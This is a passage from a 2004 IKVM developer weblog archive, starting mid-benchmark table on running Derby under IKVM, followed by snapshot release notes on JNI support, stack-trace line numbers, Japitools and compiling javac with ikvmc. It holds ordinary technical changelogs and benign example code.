<TD>getConnection</TD>
<TD align=right>1903</TD>
<TD align=right>1472</TD>
<TD align=right>2177</TD></TR>
<TR>
<TD>create table</TD>
<TD align=right>450</TD>
<TD align=right>634</TD>
<TD align=right>624</TD></TR>
<TR>
<TD>prepareStatement1</TD>
<TD align=right>344</TD>
<TD align=right>514</TD>
<TD align=right>978</TD></TR>
<TR>
<TD>1000x insert</TD>
<TD align=right>1031</TD>
<TD align=right>387</TD>
<TD align=right>550</TD></TR>
<TR>
<TD>prepareStatement2</TD>
<TD align=right>124</TD>
<TD align=right>294</TD>
<TD align=right>231</TD></TR>
<TR>
<TD>1000x select</TD>
<TD align=right>1038</TD>
<TD align=right>851</TD>
<TD align=right>3682</TD></TR></TBODY></TABLE>
<P>(Times in milliseconds, based on average of three best runs out of four runs.)</P>
<P>All the usual disclaimers about benchmarks apply of course, but it's interesting to see that IKVM on .NET outperforms JDK 1.5 on the queries. Preparing the statements take longs, but that is expected, as IKVM has to convert the generated class files to CIL (and this part of IKVM is not very efficient).</P>
<P>Another interesting aside is that when I ran the test on JDK 1.4.1, the insert operation took about 40 seconds to run. This rather extreme performance bug was fixed in 1.4.2.</P>
<P>One thing that is important to note when running Derby on IKVM is that Derby compiles all queries to bytecode and IKVM doesn't support garbage collecting classes (due to .NET's inability to unload code), so unless your application uses a fixed set of prepared statements that fit in the Derby statement cache, you're going to leak memory.</P>
<P>I made a new snapshot that includes the new sync implementation:</P>
<UL>
<LI>Resync'ed with GNU Classpath cvs.</LI>
<LI>Implemented java.io.FileDescriptor.sync() and java.nio.channels.FileChannel.force().</LI>
<LI>Fixed java.io.File to treat file paths as case insensitive on Windows.</LI>
<LI>Made exception helper a little more robust against exceptions happening early in bootstrap.</LI>
<LI>Fixed japi build file to include all the public APIs.</LI>
<LI>Fixed ClassLoaderWrapper.getSystemClassLoader() to bypass ClassLoader.getSystemClassLoader() and access the underlying field directly, to prevent a security check.</LI>
<LI>Changed DotNetTypeWrapper to overrider GetClassLoader to lazily get the system class loader.</LI>
<LI>Fixed ikvmc generated main stub to return 1 if the program exited with an exception.</LI>
<LI>Implemented support for java.security.manager system property (the security manager can now be set from the command line using -Djava.security.manager=&lt;class&gt;).</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/08/2004 11:51:13 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c129dd0d-bfec-4465-9574-5275ab785238"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c129dd0d-bfec-4465-9574-5275ab785238">Comments [7]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 04 November 2004</h2></div>
<div class="newsItems"><a name="a333d3d12-8491-4f4b-a0cb-18303aba9cfc"></a><div class="entry">
	<h3 class="entryTitle">Japitools & New Snapshot</h3>
	<div class="entryBody">
		<P>I've integrated Stuart Ballard's <A href="http://www.kaffe.org/~stuart/japi/">Japitools</A> in my build process to keep track of the API completion status and to test ikvmc and ikvmstub. To results of running it on the current ikvm development snapshot can be found <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.</P>
<P>What's new in the snapshot:</P>
<UL>
<LI>Implemented AWT Toolkit.getFontList(). 
<LI>Regenerated mscorlib, System and System.Xml stub jars with new version of ikvmstub. 
<LI>Resync'ed with GNU Classpath cvs. 
<LI>Improved error handling in Socket classes (exceptions throw now match the JDK better). 
<LI>Implemented urgent data and shutdown methods in PlainSocketImpl (thanks to Dmitry Gromov for this). 
<LI>Fixed ikvm.exe and ikvmc.exe to support slashes in Main-Class entry in manifest. 
<LI>Fixed ikvmstub.exe to emit throws clauses for constructors. 
<LI>Fixed bug that caused internal error when compiling class that has a non-private final field of a type that cannot be loaded. 
<LI>Fixed reflection on .NET types to mark non-virtual methods as final. 
<LI>Fixed name clash detection algorithm to ignore constructors (because name clash prevention isn't yet implemented for constructors). 
<LI>Fixed reflection on .NET types to ignore newslot methods that hide a virtual method in a base class. 
<LI>Fixed reflection on .NET types to not emit a public for explicitly implemented interface methods if a base class already has a suitable method. 
<LI>Removed HideFromJavaAttribute from remapped types. 
<LI>Added HideFromJavaAttribute to nested helper type generated for remapped interfaces.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2004 14:13:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=333d3d12-8491-4f4b-a0cb-18303aba9cfc"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=333d3d12-8491-4f4b-a0cb-18303aba9cfc">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 19 October 2004</h2></div>
<div class="newsItems"><a name="a01a1a935-95c7-40cd-96d4-2a0985172ef6"></a><div class="entry">
	<h3 class="entryTitle">Stack Traces & Line Numbers</h3>
	<div class="entryBody">
		<P>Today's snapshot contains a very helpful new feature: Line numbers in stack traces. Unfortunately you only get line numbers in statically compiled code on .NET 1.1, but on Whidbey you'll also get line numbers for dynamically compiled code. At the moment Mono doesn't support them at all :-(</P>
<P>Together with this I also fixed up the stack trace cleaning code to remove most of the IKVM and .NET implementation artifacts from the stack traces. If you don't want the sanitized stack traces, you can use <CODE>-Dikvm.cleanstacktrace=0</CODE> to disable it. This can be helpful to understand what's going on under the covers, especially if there is a bug in the cleanup code ;-)</P>
<P>Here is an example of a cleaned stack trace with line numbers (when run on Whidbey):</P><PRE>public class test
{
  public static void main(String[] args)
  {
    try {
      Object o = new Object();
      ((cli.System.Object)o).ToString();
    } catch(Throwable t) {
      t.printStackTrace();
    }
    try {
      new java.util.Hashtable().put(null, null);
    } catch(Throwable t) {
      t.printStackTrace();
    }
    try {
      "".endsWith(null);
    } catch(Throwable t) {
      t.printStackTrace();
    }
    try {
      "".charAt(1);
    } catch(Throwable t) {
      t.printStackTrace();
    }
  }
}
</PRE><PRE>C:\tmp&gt;ikvm test
java.lang.ClassCastException
        at test.main (test.java:7)
java.lang.NullPointerException
        at java.util.Hashtable.hash (Hashtable.java:822)
        at java.util.Hashtable.put (Hashtable.java:432)
        at test.main (test.java:12)
java.lang.NullPointerException
        at cli.System.String.EndsWith (Unknown Source)
        at java.lang.String.endsWith (map.xml:335)
        at test.main (test.java:17)
java.lang.StringIndexOutOfBoundsException
        at java.lang.String.charAt (map.xml:266)
        at test.main (test.java:22)</PRE>
<P>What's new:</P>
<UL>
<LI>Merged with Classpath cvs.</LI>
<LI>Added stub to AWT toolkit for getClasspathTextLayoutPeer.</LI>
<LI>Added two new public APIs to the runtime:<BR>- IKVM.Runtime.Util.GetClassFromObject(). It returns the java.lang.Class object corresponding to the passed in object. It is now used by java.lang.Object.getClass().<BR>- IKVM.Runtime.Util.GetClassFromTypeHandle(). This is used by the compiler when it needs the class object (for synchronized static methods, for static JNI methods and for the new 1.5 ldc class literal). </LI>
<LI>Changed map.xml String.hashCode body to redirect.</LI>
<LI>Inlined String.charAt in map.xml.</LI>
<LI>Improved stack trace cleaning so that IKVM implementation artifacts are removed from exception stack traces.</LI>
<LI>Code compiled with ikvmc now produces stack traces with line numbers even if the -debug option isn't used. On Whidbey, dynamically converted code will also have line numbers in the stack traces.</LI>
<LI>Moved my system/extension class loader implementation into GNU Classpath.</LI>
<LI>Implemented stack walking for AccessController security checks.</LI>
<LI>Fixed -D option. I used a StringDictionary to store the key/value pairs, but that converts the keys to lowercase.</LI>
<LI>Added -nostacktraceinfo option to ikvmc, to disable generating the line number information table and source file attributes.</LI>
<LI>Made ikvmc a little more robust in dealing with bogus path arguments.</LI>
<LI>Changed TypeWrapper.IsAbstract and ClassFile.IsAbstract to return true for interfaces, even if the abstract bit isn't set.</LI>
<LI>Made class loading error tracer more robust.</LI>
<LI>Introduced a CountingILGenerator wrapper for ILGenerator that keeps track of the IL offset (required for the line number tables).</LI>
<LI>Added AttributeHelper methods to set the new SourceFileAttribute and LineNumberTableAttribute.</LI>
<LI>Removed TypeWrapper.PackageName (was only used in one place and it wasn't correct for array types).</LI>
<LI>De-virtualized TypeWrapper.EmitBox (custom boxing support was previously removed).</LI>
<LI>Reflection now reports a public default constructor on all ValueTypes (on the .NET the default constructor for value types is implicit).</LI>
<LI>Finally completed the inheritance inversion for java.lang.Object/cli.System.Object and java.lang.Throwable/cli.System.Exception. Casting and instanceof tests on cli.System.Object and cli.System.Exception will now work consistently with reflection (i.e. cli.System.Object is a subclass of java.lang.Object and cli.System.Exception is a subclass of java.lang.Throwable). Similar work still needs to be done for java.lang.Comparable/cli.System.IComparable and (a little different) java.lang.String/cli.System.String.</LI>
<LI>Introduced two new custom attributes SourceFileAttribute and LineNumberTableAttribute.</LI>
<LI>Added line number tracking to map.xml parsing.</LI>
<LI>Added blt, ldc_i4_1, add and mul opcodes to remapper.</LI>
<LI>Fixed bug in remapper that caused local variables and labels outside of exception blocks not to be visible inside exception blocks.</LI>
<LI>Fixed verifier to detect trying to instantiate an array type with the new bytecode.</LI>
<LI>Fixed verifier bug that caused NullReferenceException on methods that had dead code that contain local variable stores when compiling with the -debug option.</LI>
<LI>Fixed bug in remapped type code generator that caused remapping helper methods to show up in Java reflection (I forgot to emit the HideFromJavaAttribute).</LI>
<LI>Added error handling for unknown attributes to map.xml parser.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/19/2004 16:10:46 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=01a1a935-95c7-40cd-96d4-2a0985172ef6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=01a1a935-95c7-40cd-96d4-2a0985172ef6">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 07 October 2004</h2></div>
<div class="newsItems"><a name="aba23a021-26b8-45a0-ad63-c19de0a9d8e7"></a><div class="entry">
	<h3 class="entryTitle">Generic Algorithms Revisited</h3>
	<div class="entryBody">
		<P>OSNews has an <A href="http://www.osnews.com/story.php?news_id=8484&amp;page=1">article</A> about&nbsp;using generics to do&nbsp;calculations on Whidbey. When I <A HREF="/CommentView.aspx?guid=94eed5a8-6c9c-4d1d-a001-321344a2d2f6">originally</A> wrote about this, my&nbsp;trick&nbsp;was much slower than the virtual dispatch one that Anders suggested, but it's&nbsp;nice to see that the CLR perf team paid attention, because on the current Whidbey beta it's really fast.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/07/2004 11:10:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ba23a021-26b8-45a0-ad63-c19de0a9d8e7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ba23a021-26b8-45a0-ad63-c19de0a9d8e7">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 05 October 2004</h2></div>
<div class="newsItems"><a name="ae52cb250-33b1-4d51-bb2e-8fa5c9e41e53"></a><div class="entry">
	<h3 class="entryTitle">Compiling javac into an executable with ikvmc</h3>
	<div class="entryBody">
		<P>Just a quick tip: If you want to use javac with IKVM that's possible. The only thing to watch out for is that javac requires access to the class files for the core Java classes. IKVM doesn't include these files, but you can generate them by running ikvmstub on IKVM.GNU.Classpath.dll or you can just let javac use the rt.jar of the JDK.</P>
<P>(The following examples assume that the Java SDK is installed in \j2sdk1.4.0)</P>
<P>Here's how you can run javac with ikvm (wrapped for readability):</P>
<P><CODE>ikvm -Dsun.boot.class.path=\j2sdk1.4.0\jre\lib\rt.jar<BR>&nbsp;&nbsp;&nbsp;&nbsp; -classpath \j2sdk1.4.0\lib\tools.jar<BR>&nbsp;&nbsp;&nbsp;&nbsp; com.sun.tools.javac.Main<BR>&nbsp;&nbsp;&nbsp;&nbsp; test.java</CODE></P>
<P>Here's how you can compile javac into a .NET executable:</P>
<P><CODE>ikvmc -out:javac.exe<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -main:com.sun.tools.javac.Main<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -Dsun.boot.class.path=\j2sdk1.4.0\jre\lib\rt.jar<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \j2sdk1.4.0\lib\tools.jar</CODE></P>
<P>Note that this hardcodes the path to rt.jar into the javac.exe file, so this executable can only be used on the system it was created on. Note also that you cannot redistribute the javac executable because this would violate the Sun license.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/05/2004 16:17:23 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e52cb250-33b1-4d51-bb2e-8fa5c9e41e53"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e52cb250-33b1-4d51-bb2e-8fa5c9e41e53">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="aabcec138-86cf-4f8a-ae3f-4f6890db81bf"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A couple of bug fixes and some cleanup, but the two major new features are the support for Whidbey (ikvmstub can now handle Whidbey's mscorlib) and the fact that getClassLoader() now returns the system class loader for statically compiled classes (instead of null).</P>
<P>Note that Whidbey support only means that IKVM will now run successfully on Whidbey, not that any of the new Whidbey features are available to use from Java. In particular, generic types and generic methods are not visible to Java code.</P>
<P>What's new:</P>
<UL>
<LI>Implemented support for assertions. 
<LI>Changed TimeZone code to find an existing Java timezone that matches the current .NET TimeZone (a little better than before but it's still a very lame solution). 
<LI>Added -r short form of -reference option to ikvmc. 
<LI>Improved error handling for incorrect filenames/paths in ikvmc. 
<LI>Changed TypeWrapper.GetFieldWrapper() to take a signature string instead of a TypeWrapper. 
<LI>Statically compiled code (outside of IKVM.GNU.Classpath.dll) now returns the system class loader for Class.getClassLoader(), instead of null. 
<LI>Changed FieldWrapper implementation to subclass based model instead of delegating to CodeEmitter instances. 
<LI>Removed most of the CodeEmitter functionality. 
<LI>Fixed field reflection bug (reflecting on fields in statically compiled Java types or .NET types didn't work unless you had previously reflected on the methods of the type, or dynamically compiled code against the type). 
<LI>Added preliminary support to run on Whidbey (generic types and methods will not be visible from Java). 
<LI>Removed map.xml support for <CALL ...>without sig attribute. 
<LI>Fixed reflection on .NET types to ignore methods with ByRef pointer arguments. 
<LI>Added support to ikvmstub to skip .NET types that aren't visible from Java.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
<P><STRONG>Update</STRONG>: I updated the snapshot to fix a regression when accessing fields where the field type class is not found.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/05/2004 13:32:00 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=abcec138-86cf-4f8a-ae3f-4f6890db81bf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=abcec138-86cf-4f8a-ae3f-4f6890db81bf">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 27 September 2004</h2></div>
<div class="newsItems"><a name="a1c11abc8-7e5d-4401-8638-a97773a2d1e8"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A couple of fixes and performance enhancements for static synchronized and static native methods.</P>
<P>Changes:</P>
<UL>
<LI>Fixed ikvmc so it no longer throws an exception if no output filename is specified (or implied).</LI>
<LI>Fixed monitorenter instruction and synchronized methods to not throw InterruptedException.</LI>
<LI>Added [DebuggerStepThroughAttribute] to all methods in ByteCodeHelper that didn't have it yet.</LI>
<LI>Added class object caching for static synchronized and native methods.</LI>
<LI>Fixed Thread.stop() so that it works on suspended threads.</LI>
<LI>Implemented a few more random awt peer methods.</LI>
<LI>Removed gnu.classpath.RawData mapping from map.xml.</LI>
<LI>Changed ikvm.exe setting of gnu.classpath.home and java.class.path properties so that they end up in the default system properties.</LI>
<LI>Added IKVM.Runtime.Startup.EnterMainThread() and ExitMainThread() methods (and changed ikvm.exe) to encapsulate the setup and tear-down of the main thread.</LI>
<LI>Fixed JNIEnv.MonitorEnter to use ByteCodeHelper.monitorenter.</LI>
<LI>Fixed compiler bug that caused invoking CharSequence methods to generate a ClassCastException.</LI>
<LI>Changed ikvmc main stub method to call Startup.EnterMainThread() and ExitMainThread() and to pass unhandled exceptions to ThreadGroup.uncaughtException().</LI>
<LI>Fixed JNI method invocation to not wrap exceptions in java.lang.reflect.InvocationTargetException.</LI>
<LI>Fixed support for synchronized native methods.</LI>
<LI>Fixed bug in JNI proxy generator (only used when -Xsave option is specified).</LI>
<LI>Named the WaitShutdownHook and SaveAssemblyShutdownHook threads in starter.cs.</LI>
<LI>Fixed JNIEnv.RegisterNatives when JNI proxy generator is used.</LI>
<LI>Fixed Double.parseDouble to parse +Infinity correctly.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/27/2004 12:27:17 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1c11abc8-7e5d-4401-8638-a97773a2d1e8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1c11abc8-7e5d-4401-8638-a97773a2d1e8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 15 September 2004</h2></div>
<div class="newsItems"><a name="a803d2aa6-95e7-4a22-95a0-da1b1e3ed4d4"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A new snapshot with some minor changes. In the previous entry I forgot to document two JNI restrictions:</P>
<UL>
<LI>JNI doesn't work with Mono 1.0&nbsp;on Windows (Mono doesn't do correct P/Invoke name mangling on Windows -- this can be worked around by rebuilding IKVM.Runtime.dll with the alternative DllImport attributes in JniInterface.cs).</LI>
<LI>JNI libraries are never unloaded. Class loaders aren't garbage collected and consequently, native libraries aren't either.</LI></UL>
<P>Changes:</P>
<UL>
<LI>Implemented support for <A href="http://www.faqs.org/docs/abs/HTML/globbingref.html">globbing</A> on Windows. Both to ikvm.exe and to executables compiled with ikvmc (on ikvmc it can be disabled with the -noglobbing option).</LI>
<LI>Added IKVM.Runtime.Startup class that contains globbing support and a method to set Java system properties.</LI>
<LI>Added option to ikvmc to set Java system properties before starting the application (executables only).</LI>
<LI>Disabled freeing of JNIEnv unmanaged memory (for the time being) because it causes crashes on Mono (possibly due to a GC bug in Mono).</LI>
<LI>Added optimization to mark "side effect free" static initializers with the beforefieldinit flag. (Static compilation only.)</LI>
<LI>Added special case support to the verifier for the "side effect free" optimization.</LI>
<LI>Fixed a verifier bug that caused unverifiable code to be generated in rare circumstances (the code worked OK, it just wasn't verifiable). This was the issue that caused Xerces' org.apache.xerces.util.DOMUtil.copyInto() to fail verification.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/15/2004 15:42:50 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=803d2aa6-95e7-4a22-95a0-da1b1e3ed4d4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=803d2aa6-95e7-4a22-95a0-da1b1e3ed4d4">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 09 September 2004</h2></div>
<div class="newsItems"><a name="a56499ca8-1139-4469-a7bf-60a1b1ee55be"></a><div class="entry">
	<h3 class="entryTitle">JNI Code Complete & A New Snapshot</h3>
	<div class="entryBody">
		<P>JNI is now done. Almost complete support for all J2SE 1.4 JNI functionality. There are a few (permanent) restrictions:</P>
<UL>
<LI>It's much slower than on a real JVM (most operations are between 10x and 100x slower).</LI>
<LI>You cannot create a string instance with AllocObject and then call the constructor on it with CallNonvirtualVoidMethod. This is unlikely to be a problem, because there really is no reason to go through all this trouble to create a string. The normal ways to create a strings are NewString, NewStringUTF and NewObject and these work fine. If any app were found that depended on two step string construction, a workaround for that particular app could probably be added.</LI>
<LI>JVM.DLL, which implements the three static invocation API functions, only works on Win32.</LI>
<LI>JNI_CreateJavaVM only supports the JDK 1.2 style init args and only the -D option (to define Java properties).</LI>
<LI>JNI_GetDefaultJavaVMInitArgs is not implemented. It's only used for JDK 1.1 style JVM creation, so I don't think it'll be used anymore. If anyone requires it, it could be implemented.</LI>
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred.</LI>
<LI>JavaVM.DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR).</LI>
<LI>JavaVM.DetachCurrentThread doesn't release monitors held by the thread.</LI></UL>
<P>JVM.DLL is really cool. It's a small stub created with ILASM. It's only a few lines of code and all it really does is export three managed functions to the unmanaged world. The ability to export managed functions is is a very nice CLR feature that is relatively unknown. On a Win32 system, any native application that hosts the Sun Java Virtual Machine can now use IKVM (without modifying the native app), simply by copying the IKVM DLLs into the native applications directory and removing the real Java VM JVM.DLL from the PATH.</P>
<P>Changes:</P>
<UL>
<LI>Imported new Classpath TimeZone handling. This still leaves TimeZone support in a very broken state, but at least the Classpath VM interface is now more powerful and should hopefully allow a correct implementation when I get around to it.</LI>
<LI>Finally added namespaces to all public classes in IKVM.Runtime.dll. There are IKVM.Attributes, IKVM.Runtime, IKVM.Internal and IKVM.NativeCode. IKVM.Internal contains public types that really shouldn't be public, but have to be public because ikvm or ikvmc depend on them. In IKVM.NativeCode live the implementations of the GNU Classpath native methods.<BR>Don't use the types in the IKVM.Internal or IKVM.NativeCode namespace in your own projects, because they are likely to go away or change in incompatible ways. IKVM.Attributes and IKVM.Runtime are going to be relatively stable (but they can still change up until the 1.0 release) .</LI>
<LI>Added support for JNI thread detaching and waiting for all non-daemon threads to end to VMThread.java.</LI>
<LI>Added GetClassFromTypeHandle method to ByteCodeHelper, this replaces the direct use of NativeCode.java.lang.VMClass.getClassFromType by JNI method stubs and synchronized static methods.</LI>
<LI>Moved the various arraycopy methods from NativeCode.java.lang.VMSystem to ByteCodeHelper.</LI>
<LI>Added getSystemClassLoader method to ClassLoaderWrapper.</LI>
<LI>JavaException.cs: Removed message from ArrayStoreException and added InstantiationException.</LI>
<LI>Added invocation API support to JNI.</LI>
<LI>Renamed JniFrame to Frame and made it an innerclass of IKVM.Runtime.JNI.</LI>
<LI>Implemented more efficient way to determine active JNI method class loader in JNIEnv.FindClass.</LI>
<LI>Fixed JNI method resolution to look for short and long method names in each native library (previous it would first search all libraries for the short name and then in another pass would look for the long names).</LI>
<LI>Added support for JavaVMAttachArgs to JavaVM.AttachCurrentThread.</LI>
<LI>Implemented JavaVM.DestroyJavaVM.</LI>
<LI>Implemented JavaVM.DetachCurrentThread.</LI>
<LI>Implemented JavaVM.AttachCurrentThreadAsDaemon.</LI>
<LI>Implemented JNIEnv cleanup when thread dies.</LI>
<LI>Fixed JNIEnv.DefineClass to decode name as platform specific instead of UTF-8.</LI>
<LI>Fixed JNIEnv.FindClass to decode name as platform specific instead of UTF-8.</LI>
<LI>Fixed JNIEnv.SetPendingException to do exception mapping and set the stack trace.</LI>
<LI>Fixed JNIEnv.ThrowNew to decode message as platform specific instead of UTF-8.</LI>
<LI>Fixed JNIEnv.ExceptionDescribe to clear pending exception (and to actually work).</LI>
<LI>Fixed JNIEnv.FatalError to decode message as platform specific instead of UTF-8.</LI>
<LI>Added error handling to JNIEnv.AllocObject (if you try to create interface or abstract class instance).</LI>
<LI>Added error handling and value type support to JNIEnv.NewObjectArray.</LI>
<LI>Added value type support to JNIEnv.GetObjectArrayElement and JNIEnv.SetObjectArrayElement.</LI>
<LI>Added error handling to the various JNIEnv.New&lt;PrimitiveType&gt;Array functions.</LI>
<LI>Added error handling to the various JNIEnv.Get&lt;PrimitiveType&gt;ArrayRegion and JNIEnv.Set&lt;PrimitiveType&gt;ArrayRegion functions.</LI>
<LI>Implemented growing the local ref table for native methods that use (or leak) excessive amounts of local refs.</LI>
<LI>Changed stack and local variable type encoding of value types and enums to System.ValueType and System.Enum respectively (instead of simply System.Object).</LI>
<LI>Fixed bug in bytecode compiler that caused it emit incorrect code when calling inherited methods on value types or enums.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/09/2004 13:51:09 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=56499ca8-1139-4469-a7bf-60a1b1ee55be"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=56499ca8-1139-4469-a7bf-60a1b1ee55be">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 05 September 2004</h2></div>
<div class="newsItems"><a name="a7f588362-ef57-44e5-8714-8fe6f6fc2b32"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A couple of fixes and a clean up of the JNI code. The Managed C++ JNI provider used some clever tricks and when I ported them to C# they turned into ugly hacks, so I removed them. More on that in a future entry.</P>
<P>Changes:</P>
<UL>
<LI>Changed VMAccessController and VMClassLoader to use .NET thread local storage instead of a Java ThreadLocal to reduce initialization order dependencies. 
<LI>Added -XXsave flag to ikvm.exe to save debug image of single threaded apps that don't call System.exit(). 
<LI>Added -apartment:[sta|mta|none] flag to ikvmc (default is to apply the STAThreadAttribute to main). 
<LI>Added Win64 support to ikvm-native. 
<LI>Fixed class file parser to properly resize the instruction array. Previously, the compiler got confused when emitting debugging information. 
<LI>Added code to save the assembly used for non-virtual reflective method invocations when -Xsave is used. 
<LI>Introduced JNI type name aliases in JniInterface to make the code more readable. 
<LI>Implemented JNI functions: EnsureLocalCapacity, PushLocalFrame, PopLocalFrame, NewWeakGlobalRef and DeleteWeakGlobalRef. 
<LI>Fixed Debug.Assert in GhostMethodWrapper (MemberWrapper.cs). 
<LI>Fixed JniProxyBuilder to emit ldtoken and pass it as an argument to the real JNI method. 
<LI>Improved error handling in gnu.java.io.EncodingManager. 
<LI>Fixed support for setting the java.library.path property on the ikvm.exe command line. 
<LI>Fixed default java.library.path on Windows. 
